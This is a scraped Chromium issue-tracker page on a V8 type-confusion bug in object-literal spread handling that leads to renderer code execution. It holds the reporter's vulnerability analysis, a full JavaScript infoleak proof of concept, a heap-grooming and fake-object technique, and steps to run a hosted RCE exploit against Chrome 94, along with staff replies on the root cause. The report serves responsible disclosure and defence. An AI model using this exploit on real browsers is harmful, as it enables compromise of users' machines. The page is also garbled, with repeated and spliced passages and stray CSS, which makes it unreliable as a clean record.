class="line"><!---->3. ./out/x64.debug/d8 poc.js<!----></span><br><br>EXPLOIT<span class="line"><!---->EXPLOIT<!----></span><br>1. Create a fresh Ubuntu 18.04.6 VM and install Chrome<span class="line"><!---->1. Create a fresh Ubuntu 18.04.6 VM and install Chrome<!----></span><br>2. Install Google Chrome version 94.0.4606.81<span class="line"><!---->2. Install Google Chrome version 94.0.4606.81<!----></span><br>3. Navigate to <span class="line"><!---->3. Navigate to <!----></span>https://chromepwn1.pw/parent-6a204bd89f3c8348afd5c77c717a097a.html<a class="undefined" target="_blank" href="https://chromepwn1.pw/parent-6a204bd89f3c8348afd5c77c717a097a.html"><!---->https://chromepwn1.pw/parent-6a204bd89f3c8348afd5c77c717a097a.html<!----></a><br>3a. NOTE: My server is required because I take advantage of site-isolation to spawn multiple renderer processes in different "sites".<span class="line"><!---->3a. NOTE: My server is required because I take advantage of site-isolation to spawn multiple renderer processes in different "sites".<!----></span><br>4. View the source in the attachment 28_fakeobj_remote_fresh.tar.gz<span class="line"><!---->4.         Details from the reporter I forgot to copy over for the RCE exploit:<span class="line"><!---->Details from the reporter I forgot to copy over for the RCE exploit:<!----></span><br><br>-------<span class="line"><!---->-------<!----></span><br><br>To host the renderer exploit locally you need to change a few things:<span class="line"><!---->To host the renderer exploit locally you need to change a few things:<!----></span><br><br>SERVER<span class="line"><!---->SERVER<!----></span><br>Host three https sites:<span class="line"><!---->Host three https sites:<!----></span><br>site1.com<a class="undefined" target="_blank" href="https://site1.com"><!---->site1.com<!----></a><br>site2.com<a class="undefined" target="_blank" href="https://site2.com"><!---->site2.com<!----></a><br>site3.com<a class="undefined" target="_blank" href="https://site3.com"><!---->site3.com<!----></a><br><br>And then host the contents of 28_fakeobj_remote_fresh.tar.gz on each of the sites. Then replace all instances of chromepwn1.pwn, chromepwn2.pw, and chromepwn3.pw in the source with<span class="line"><!---->And then host the contents of 28_fakeobj_remote_fresh.tar.gz on each of the sites. Then replace all instances of chromepwn1.pwn, chromepwn2.pw, and chromepwn3.pw in the source with<!----></span> <span class="line"><!----> <!----></span>site1.com<a class="undefined" target="_blank" href="https://site1.com"><!---->site1.com<!----></a>,<span class="line"><!---->,<!----></span> <span class="line"><!----> <!----></span>site2.com<a class="undefined" target="_blank" href="https://site2.com"><!---->site2.com<!----></a>, and<span class="line"><!---->, and<!----></span> <span class="line"><!----> <!----></span>site3.com<a class="undefined" target="_blank" href="https://site3.com"><!---->site3.com<!----></a> in the javascript/html files within 28_fakeobj_remote_fresh.<span class="line"><!----> in the javascript/html files within 28_fakeobj_remote_fresh.<!----></span><br><br>CLIENT<span class="line"><!---->CLIENT<!----></span><br>1. Create a fresh Ubuntu 18.04.6 VM and install Chrome<span class="line"><!---->1. Create a fresh Ubuntu 18.04.6 VM and install Chrome<!----></span><br>2. Install Google Chrome version 94.0.4606.81<span class="line"><!---->2. Install Google Chrome version 94.0.4606.81<!----></span><br>3. Navigate to <span class="line"><!---->3. Navigate to <!----></span>https://site1.com/parent-6a204bd89f3c8348afd5c77c717a097a.html<a class="undefined" target="_blank" href="https://site1.com/parent-6a204bd89f3c8348afd5c77c717a097a.html"><!---->https://site1.com/parent-6a204bd89f3c8348afd5c77c717a097a.html<!----></a><br><br>-------<span class="line"><!---->-------<!----></span><br><br>I was able to run this by swapping in `site1.localhost`, `site2.localhost`,  and `site3.localhost` (with entries pointing to 127.0.0.1 in /etc/hosts) and Caddy's built-in support for setting up a local root CA. Testing initially, the iframe crashed immediately for me on Linux 94.0.4606.81. Retrying in an Incognito window the iframe didn't crash immediately but it did crash after I clicked "Calc" in the iframe. <span class="line"><!---->I was able to run this by swapping in `site1.localhost`, `site2.localhost`,  and `site3.localhost` (with entries pointing to 127.0.0.1 in /etc/hosts) and Caddy's built-in support for setting up a local root CA. Testing initially, the iframe crashed immediately for me on Linux 94.0.4606.81. Retrying in an Incognito window the iframe didn't crash immediately but it did crash after I clicked "Calc" in the iframe. <!----></span><br><br>I noticed there is some javascript commented out in the parent-6a...html file -- is this intentional? Should I add it back in?<span class="line"><!---->I noticed there is some javascript commented out in the parent-6a...html file -- is this intentional? Should I add it back in?<!----></span><br><br>I'll spin up an 18.04.6 VM instance next to test there -- this was on Debian.<span class="line"><!---->I'll spin up an 18.04.6 VM instance next to test there -- this was on Debian.<!----></span><mr-comment-content></mr-comment-content>

        Thanks for the report!<span class="line"><!---->Thanks for the report!<!----></span><br>The second patch (<span class="line"><!---->The second patch (<!----></span>https://crrev.com/c/3224666<a class="undefined" target="_blank" href="https://crrev.com/c/3224666"><!---->https://crrev.com/c/3224666<!----></a>)<span class="line"><!---->)<!----></span> has an issue with keyed properties, as used in your repro.<span class="line"><!----> has an issue with keyed properties, as used in your repro.<!----></span><br>I am not sure how quickly we would have caught this problem without your report, so thanks a lot!<span class="line"><!---->I am not sure how quickly we would have caught this problem without your report, so thanks a lot!<!----></span><br>As for the root cause: It should never happen that `target` is equal to `from`. The real root cause is that it was possible to leak the pointer to the object during creation by executing user code, which shouldn't happen (the setter in your poc shouldn't be executed).<span class="line"><!---->As for the root cause: It should never happen that `target` is equal to `from`. The real root cause is that it was possible to leak the pointer to the object during creation by executing user code, which shouldn't happen (the setter in your poc shouldn't be executed).<!----></span><mr-comment-content></mr-comment-content>

        *** Boilerplate reminders! ***<span class="line"><!---->*** Boilerplate reminders! ***<!----></span><br>Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.<span class="line"><!---->Please do NOT publicly disclose details until a fix has been released to all our users.         This bug has been closed for more than 14 weeks. Removing security view restrictions.<span class="line"><!---->This bug has been closed for more than 14 weeks. Removing security view restrictions.<!----></span><br><br>For more details visit <span class="line"><!---->For more details visit <!----></span>https://www.chromium.org/issue-tracking/autotriage<a class="undefined" target="_blank" href="https://www.chromium.org/issue-tracking/autotriage"><!---->https://www.chromium.org/issue-tracking/autotriage<!----></a> - Your friendly Sheriffbot<span class="line"><!----> - Your friendly Sheriffbot<!----></span><mr-comment-content></mr-comment-content>

      </option>
    <!---->
        </select>
      <div class="select-container">
        <select aria-label="Description history menu" hidden="">
          <!---->
      <option value="0" selected="">
        Description #1 by cthomp@chromium.org (Oct 14, 2021)
      </option>
    <!---->
        </select>
      </div>
      This bug is split off from <span class="line"><!---->This bug is split off from <!----></span>Issue 1260109<a class="strike-through" target="_blank" href="/p/chromium/issues/detail?id=1260109" title="Security: [Umbrella Bug] V8 CreateLiteral type confusion when processing ..spread leads to RCE + RenderFrameHostImpl logic error leading browser UAF"><!---->Issue 1260109<!----></a> <span class="line"><!----> <!----></span>to track the V8 type confusion bug portion of that report. Details below are copied from that bug. <span class="line"><!---->to track the V8 type confusion bug portion of that report. Details below are copied from that bug. <!----></span><br><br>-------------------------<b class="line"><!---->-------------------------<!----></b><br><br>= RCE: Type confusion when creating an object literal with the `...spread operation`<span class="line"><!---->= RCE: Type confusion when creating an object literal with the `...spread operation`<!----></span><br>-------------------------<b class="line"><!---->-------------------------<!----></b>-------------------------------------------------------<span class="line"><!---->-------------------------------------------------------<!----></span><br><br>I. VULNERABILITY DETAILS<span class="line"><!---->I. VULNERABILITY DETAILS<!----></span><br><br>When creating an object literal with the `...spread` operator the bytecode generator has two branches, I'll be focusing on the first branch [0]. If the first "argument" when creating the object literal is a `...spread` operator the bytecode generator will output a `CloneObject` [1]. `CloneObject` will call `CloneObjectIC_Slow` if the feedback vector is not set. `CloneObjectIC_Slow` will only set the properties in the `target` (`literal` in this case) object if they are in the `source` object. This is important for later.<span class="line"><!---->When creating an object literal with the `...spread` operator the bytecode generator has two branches, I'll be focusing on the first branch [0]. If the first "argument" when creating the object literal is a `...spread` operator the bytecode generator will output a `CloneObject` [1]. `CloneObject` will call `CloneObjectIC_Slow` if the feedback vector is not set. `CloneObjectIC_Slow` will only set the properties in the `target` (`literal` in this case) object if they are in the `source` object. This is important for later.<!----></span><br><br>```<span class="line"><!---->```<!----></span><br>var source = { n : 5 };<span class="line"><!---->var source = { n : 5 };<!----></span><br>var object = { ...source };<span class="line"><!---->var object = { ...source };<!----></span><br>```<span class="line"><!---->```<!----></span><br><br>Next within the bytecode generator, if any indexes are in being declared in the object literal after the `...spread` operator then `Runtime_SetKeyedProperty` will be called on the `literal` object [2]. `Runtime_SetKeyedProperty` has two interesting characteristics: it will walk up prototype chains and it will trigger the `setter` callback. The combination of these two characteristics means we can define a setter on `Object.prototype` and assign a global variable to `this` within the getter to get a reference to the `literal` object. The example code below showcases how this works logically, the `duped` variable and `result` are the same object.<span class="line"><!---->Next within the bytecode generator, if any indexes are in being declared in the object literal after the `...spread` operator then `Runtime_SetKeyedProperty` will be called on the `literal` object [2]. `Runtime_SetKeyedProperty` has two interesting characteristics: it will walk up prototype chains and it will trigger the `setter` callback. The combination of these two characteristics means we can define a setter on `Object.prototype` and assign a global variable to `this` within the getter to get a reference to the `literal` object. The example code below showcases how this works logically, the `duped` variable and `result` are the same object.<!----></span><br><br>```<span class="line"><!---->```<!----></span><br>Object.prototype.__defineSetter__(0, function() {<span class="line"><!---->Object.prototype.__defineSetter__(0, function() {<!----></span><br>   duped = this; <span class="line"><!---->   duped = this; <!----></span><br>});<span class="line"><!---->});<!----></span><br>var source = { n : 5 };<span class="line"><!---->var source = { n : 5 };<!----></span><br>var result = { ...source, 0 : 5 };<span class="line"><!---->var result = { ...source, 0 : 5 };<!----></span><br>%DebugPrint(result);<span class="line"><!---->%DebugPrint(result);<!----></span><br>%DebugPrint(duped);<span class="line"><!---->%DebugPrint(duped);<!----></span><br>```<span class="line"><!---->```<!----></span><br><br>Next within the bytecode generator, more spreads are processed. This uses `Runtime::kInlineCopyDataProperties` with `literal` as the target and the "argument" as the source [3]. Here we make the target == source by passing the `literal` object that we grabbed in the setter with a spread operator. This will trigger a DCHECK in Builtins::CopyDataProperties which the intrinsic `Runtime::kInlineCopyDataProperties` gets lowered to [4].<span class="line"><!---->Next within the bytecode generator, more spreads are processed. This uses `Runtime::kInlineCopyDataProperties` with `literal` as the target and the "argument" as the source [3]. Here we make the target == source by passing the `literal` object that we grabbed in the setter with a spread operator. This will trigger a DCHECK in Builtins::CopyDataProperties which the intrinsic `Runtime::kInlineCopyDataProperties` gets lowered to [4].<!----></span><br><br>```<span class="line"><!---->```<!----></span><br>Object.prototype.__defineSetter__(0, function() {<span class="line"><!---->Object.prototype.__defineSetter__(0, function() {<!----></span><br>   duped = this; <span class="line"><!---->   duped = this; <!----></span><br>});<span class="line"><!---->});<!----></span><br>var source = { n : 5 };<span class="line"><!---->var source = { n : 5 };<!----></span><br>var result = { ...source, 0 : 5, ...duped };<span class="line"><!---->var result = { ...source, 0 : 5, ...duped };<!----></span><br>```<span class="line"><!---->```<!----></span><br><br>II. EXPLOITATION DETAILS<span class="line"><!---->II. EXPLOITATION DETAILS<!----></span><br><br>Next if the map of the `target` object is deprecated, then the builtin SetOrCopyDataProperties will bailout to `Runtime_CopyDataProperties` which will eventually call `JSReceiver::FastAssign`. Within this function there is a call to `JSObject::CreateDataProperty` [6] that is not protected by a stable map check [5]. When source == destination, `JSReceiver::CreateDataProperty` can cause the object to convert from FastProperties to DictionaryProperties if an accessor is being redefined to a normal value AND the splitmap's transition array is full (if it contains 1536 transitions). Full Infoleak POC:<span class="line"><!---->Next if the map of the `target` object is deprecated, then the builtin SetOrCopyDataProperties will bailout to `Runtime_CopyDataProperties` which will eventually call `JSReceiver::FastAssign`. Within this function there is a call to `JSObject::CreateDataProperty` [6] that is not protected by a stable map check [5]. When source == destination, `JSReceiver::CreateDataProperty` can cause the object to convert from FastProperties to DictionaryProperties if an accessor is being redefined to a normal value AND the splitmap's transition array is full (if it contains 1536 transitions). Full Infoleak POC:<!----></span><br><br>```<span class="line"><!---->```<!----></span><br>var a = { n : 5 };<span class="line"><!---->var a = { n : 5 };<!----></span><br><br>let return_double = function() {<span class="line"><!---->let return_double = function() {<!----></span><br>    return 5.5;<span class="line"><!---->    return 5.5;<!----></span><br>}<span class="line"><!---->}<!----></span><br><br>Object.prototype.__defineSetter__(0, function() { <span class="line"><!---->Object.prototype.__defineSetter__(0, function() { <!----></span><br>    duped = this;<span class="line"><!---->    duped = this;<!----></span><br>    duped.__defineGetter__('getter', return_double);<span class="line"><!---->    duped.__defineGetter__('getter', return_double);<!----></span><br>    duped.o = 1.1;<span class="line"><!---->    duped.o = 1.1;<!----></span><br>    duped.p = 1.1;<span class="line"><!---->    duped.p = 1.1;<!----></span><br>    duped.q = 1.1;<span class="line"><!---->    duped.q = 1.1;<!----></span><br>    duped.r = 1.1;<span class="line"><!---->    duped.r = 1.1;<!----></span><br>    duped.s = 1.1;<span class="line"><!---->    duped.s = 1.1;<!----></span><br>    duped.t = 1.1;<span class="line"><!---->    duped.t = 1.1;<!----></span><br><br>    /*<span class="line"><!---->    /*<!----></span><br>        1. Create `b` an object that shares a map<span class="line"><!---->        1. Create `b` an object that shares a map<!----></span><br>           map with `duped`.<span class="line"><!---->           map with `duped`.<!----></span><br>    */<span class="line"><!---->    */<!----></span><br>    b = {};<span class="line"><!---->    b = {};<!----></span><br>    b.n = 5; <span class="line"><!---->    b.n = 5; <!----></span><br>    b.__defineGetter__('getter', return_double);<span class="line"><!---->    b.__defineGetter__('getter', return_double);<!----></span><br>    b.o = 1.1;<span class="line"><!---->    b.o = 1.1;<!----></span><br>    b.p = 1.1;<span class="line"><!---->    b.p = 1.1;<!----></span><br>    b.q = 1.1;<span class="line"><!---->    b.q = 1.1;<!----></span><br>    b.r = 1.1;<span class="line"><!---->    b.r = 1.1;<!----></span><br>    b.s = 1.1;<span class="line"><!---->    b.s = 1.1;<!----></span><br>    b.t = 1.1;<span class="line"><!---->    b.t = 1.1;<!----></span><br><br>    // deprecate `duped`'s map<span class="line"><!---->    // deprecate `duped`'s map<!----></span><br>    b.n = 1.1;<span class="line"><!---->    b.n = 1.1;<!----></span><br><br><br>    // Fill up the SplitMap's transition array<span class="line"><!---->    // Fill up the SplitMap's transition array<!----></span><br>    for (var i = 0; i < 1024 + 1024; i++) {<span class="line"><!---->    for (var i = 0; i &lt; 1024 + 1024; i++) {<!----></span><br>        var tmp = {};<span class="line"><!---->        var tmp = {};<!----></span><br>        tmp.n = 5;<span class="line"><!---->        tmp.n = 5;<!----></span><br>        tmp['tt' + i.toString()] = 5;<span class="line"><!---->        tmp['tt' + i.toString()] = 5;<!----></span><br>    }<span class="line"><!---->    }<!----></span><br><br>});<span class="line"><!---->});<!----></span><br><br>var obj = { ...a , 0 : 5 , ...duped};<span class="line"><!---->var obj = { ...a , 0 : 5 , ...duped};<!----></span><br><br>print(obj.o);<span class="line"><!---->print(obj.o);<!----></span><br>print(obj.p);<span class="line"><!---->print(obj.p);<!----></span><br>print(obj.q);<span class="line"><!---->print(obj.q);<!----></span><br>print(obj.r);<span class="line"><!---->print(obj.r);<!----></span><br>print(obj.s);<span class="line"><!---->print(obj.s);<!----></span><br>print(obj.t);<span class="line"><!---->print(obj.t);<!----></span><br>```<span class="line"><!---->```<!----></span><br><br>Turning this into an RCE was tough because unboxed doubles were removed and the number of constraints involved when src == dst, but I found a way by abusing the in-object properties. The basic idea is that when the map transitions from FastProperties to DictionaryProperties in-object properties are cleared, but the DescriptorArray will still have the cached descriptor of in_object() for the first four properties of the object [7]. Using determinism in scavenge garbage collection routines I was able to trigger a garbage collection after the in-object properties were cleared, resulting in the object being moved to old space and compacted with other objects. With a clever heap-groom I was able to place a BigInt object immediately after the object in OldSpace <span class="line"><!---->Turning this into an RCE was tough because unboxed doubles were removed and the number of constraints involved when src == dst, but I found a way by abusing the in-object properties. The basic idea is that when the map transitions from FastProperties to DictionaryProperties in-object properties are cleared, but the DescriptorArray will still have the cached descriptor of in_object() for the first four properties of the object [7]. Using determinism in scavenge garbage collection routines I was able to trigger a garbage collection after the in-object properties were cleared, resulting in the object being moved to old space and compacted with other objects. With a clever heap-groom I was able to place a BigInt object immediately after the object in OldSpace <!----></span><br><br>```<span class="line"><!---->```<!----></span><br>Before GC:<span class="line"><!---->Before GC:<!----></span><br>[Map][Properties][elements][inobject #0][inobject #1][inobject #2][inobject #3]<span class="line"><!---->[Map][Properties][elements][inobject #0][inobject #1][inobject #2][inobject #3]<!----></span><br><br>After GC:<span class="line"><!---->After GC:<!----></span><br>[Map][Properties][elements][Bigint Map][Bigint Length][digits][digits]<span class="line"><!---->[Map][Properties][elements][Bigint Map][Bigint Length][digits][digits]<!----></span><br>```<span class="line"><!---->```<!----></span><br><br>Giving me the ability to place any value in the now OOB read to the [inobject] slot after the GC, allowing me to create a Fake Object.<span class="line"><!---->Giving me the ability to place any value in the now OOB read to the [inobject] slot after the GC, allowing me to create a Fake Object.<!----></span><br><br>NOTE: The GC timing is deterministic for hosts with >2GB of memory. Hosts with less than 2GB of memory will require a different heap-spray. The exploit in its current state doesn't use the infoleak above and just uses fixed offsets so it will only work on 94.0.4606.81 on ubuntu.<span class="line"><!---->NOTE: The GC timing is deterministic for hosts with &gt;2GB of memory. Hosts with less than 2GB of memory will require a different heap-spray. The exploit in its current state doesn't use the infoleak above and just uses fixed offsets so it will only work on 94.0.4606.81 on ubuntu.<!----></span><br><br>III. REPRODUCTION DETAILS<span class="line"><!---->III. REPRODUCTION DETAILS<!----></span><br><br>POC<span class="line"><!---->POC<!----></span><br>1. Build D8<span class="line"><!---->1. Build D8<!----></span><br>2. ./out/x64.release/d8 poc.js<span class="line"><!---->2. ./out/x64.release/d8 poc.js<!----></span><br>3. ./out/x64.debug/d8 poc.js<span class="line"><!---->3. ./out/x64.debug/d8 poc.js<!----></span><br><br>EXPLOIT<span class="line"><!---->EXPLOIT<!----></span><br>1. Create a fresh Ubuntu 18.04.6 VM and install Chrome<span class="line"><!---->1. Create a fresh Ubuntu 18.04.6 VM and install Chrome<!----></span><br>2. Install Google Chrome version 94.0.4606.81<span class="line"><!---->2. Install Google Chrome version 94.0.4606.81<!----></span><br>3. Navigate to <span class="line"><!---->3. Navigate to <!----></span>https://chromepwn1.pw/parent-6a204bd89f3c8348afd5c77c717a097a.html<a class="undefined" target="_blank" href="https://chromepwn1.pw/parent-6a204bd89f3c8348afd5c77c717a097a.html"><!---->https://chromepwn1.pw/parent-6a204bd89f3c8348afd5c77c717a097a.html<!----></a><br>3a. NOTE: My server is required because I take advantage of site-isolation to spawn multiple renderer processes in different "sites".<span class="line"><!---->3a. NOTE: My server is required because I take advantage of site-isolation to spawn multiple renderer processes in different "sites".<!----></span><br>4. View the source in the attachment 28_fakeobj_remote_fresh.tar.gz<span class="line"><!---->4. View the source in the attachment 28_fakeobj_remote_fresh.tar.gz<!----></span><br><br>[0] <span class="line"><!---->[0] Testing initially, the iframe crashed immediately for me on Linux 94.0.4606.81. Retrying in an Incognito window the iframe didn't crash immediately but it did crash after I clicked "Calc" in the iframe. <span class="line"><!---->I was able to run this by swapping in `site1.localhost`, `site2.localhost`,  and `site3.localhost` (with entries pointing to 127.0.0.1 in /etc/hosts) and Caddy's built-in support for setting up a local root CA.         Thanks for the report!<span class="line"><!---->Thanks for the report!<!----></span><br>The second patch (<span class="line"><!---->The second patch (<!----></span>https://crrev.com/c/3224666<a class="undefined" target="_blank" href="https://crrev.com/c/3224666"><!---->https://crrev.com/c/3224666<!----></a>)<span class="line"><!---->)<!----></span> has an issue with keyed properties, as used in your repro.<span class="line"><!----> has an issue with keyed properties, as used in your repro.<!----></span><br>I am not sure how quickly we would have caught this problem without your report, so thanks a lot!<span class="line"><!---->I am not sure how quickly we would have caught this problem without your report, so thanks a lot!<!----></span><br>As for the root cause: It should never happen that `target` is equal to `from`. The real root cause is that it was possible to leak the pointer to the object during creation by executing user code, which shouldn't happen (the setter in your poc shouldn't be executed).<span class="line"><!---->As for the root cause: It should never happen that `target` is equal to `from`. The real root cause is that it was possible to leak the pointer to the object during creation by executing user code, which shouldn't happen (the setter in your poc shouldn't be executed).<!----></span><mr-comment-content></mr-comment-content>

        *** Boilerplate reminders! ***<span class="line"><!---->*** Boilerplate reminders! ***<!----></span><br>Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.<span class="line"><!---->Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.<!----></span><br><br>Please contact <span class="line"><!---->Please contact <!----></span>security-vrp@chromium.org<a class="undefined" target="_blank" href="mailto:security-vrp@chromium.org"><!---->security-vrp@chromium.org<!----></a> with any questions.<span class="line"><!----> with any questions.<!----></span><br>******************************<span class="line"><!---->******************************<!----></span><mr-comment-content></mr-comment-content>

          background-color: var(--chops-white);

          align-items: stretch;

        Description #1 by cthomp@chromium.org (Oct 14, 2021)
      <option value="0" selected="">
        Description #1 by cthomp@chromium.org (Oct 14, 2021)

      <option value="0" selected="">
        Description #1 by cthomp@chromium.org (Oct 14, 2021)
